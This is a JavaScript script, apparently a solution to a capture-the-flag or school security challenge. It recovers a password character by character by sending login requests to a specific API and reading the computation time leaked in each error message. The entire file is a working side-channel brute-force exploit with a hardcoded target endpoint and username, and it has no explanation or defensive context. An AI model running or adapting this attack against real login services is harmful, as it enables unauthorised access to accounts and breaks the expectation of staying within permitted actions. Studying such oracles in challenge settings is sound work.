
const CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}!-@$".split("");

async function solve() {

    let currentCompute = 0;
    let currentPassword = "";

    let updated = true;

    while (updated) {

        if (currentPassword) console.log(currentPassword);

        updated = false;
        
        for (const char of CHARS) {
            const result = await attempt(`${currentPassword}${char}`);
            if (result === true) return;
            else if (result > currentCompute) {
                currentCompute = result;
                currentPassword += char;
                updated = true;
                break;
            }
        }

    }

    console.log(currentCompute);
}

async function attempt(pPasword) {
    const response = await fetch("https://omnisus-api.defi.info.cegepmontpetit.ca/api/Account/Login", {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            username: "utilisateur_test_pour_nouvelle_connexion",
            password: pPasword
        })
    });
    const parsed = await response.json();
    if (parsed.error) {
        const match = parsed.error.match(/Temps de calcul : (\d+)ms/);
        if (match) {
            return parseInt(match[1], 10);
        }
        else {
            console.error(`API returned unexpected result: ${parsed}`);
            return true;
        }
    }
    else {
        console.log(`Solution found: ${parsed}`);
        return true;
    }
}

solve();